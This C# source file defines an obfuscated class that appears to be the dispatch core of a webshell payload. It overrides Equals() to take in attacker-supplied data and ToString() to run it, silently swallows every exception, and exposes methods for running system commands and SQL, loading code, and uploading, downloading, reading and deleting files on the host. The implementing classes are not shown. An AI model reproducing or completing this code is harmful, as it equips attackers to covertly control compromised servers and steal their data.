using System;
using System.Collections;
using System.IO;

public class LY
{
	internal static Hashtable cache = new Hashtable();
	internal Hashtable vars;
	internal Hashtable ctx;
	internal MemoryStream sink;
	internal byte[] blob;

	public override bool Equals(object obj)
	{
		try
		{
			if (obj is byte[])
			{
				blob = (byte[])obj;
			}
			else if (obj is MemoryStream)
			{
				sink = (MemoryStream)obj;
			}
			else if (obj is Hashtable)
			{
				cache = (Hashtable)obj;
			}
		}
		catch (Exception)
		{
		}
		return false;
	}

	public override string ToString()
	{
		if (sink != null && blob != null)
		{
			try
			{
				Nx.Top.Run(this);
			}
			catch (Exception)
			{
			}
		}
		return base.ToString();
	}

	public byte[] getBasicsInfo() { return Nx.Job.Info(this); }
	public byte[] test() { return Nx.Job.Test(this); }
	public byte[] setFileAttr() { return Nx.Job.SetAttr(this); }
	public byte[] fileRemoteDown() { return Nx.Job.Down(this); }
	public byte[] deleteFile() { return Nx.Job.Del(this); }
	public byte[] copyFile() { return Nx.Job.Copy(this); }
	public byte[] moveFile() { return Nx.Job.Move(this); }
	public byte[] newFile() { return Nx.Job.NewF(this); }
	public byte[] newDir() { return Nx.Job.NewD(this); }
	public byte[] readFile() { return Nx.Job.Read(this); }
	public byte[] include() { return Nx.Job.Load(this); }
	public byte[] execCommand() { return Nx.Job.Exec(this); }
	public byte[] execSql() { return Nx.Job.Sql(this); }
	public byte[] uploadFile() { return Nx.Job.Up(this); }
	public byte[] close() { return Nx.Job.Close(this); }
	public byte[] bigFileUpload() { return Nx.Job.BUp(this); }
	public byte[] bigFileDownload() { return Nx.Job.BDn(this); }
	public byte[] getFile() { return Nx.Job.Browse(this); }
}
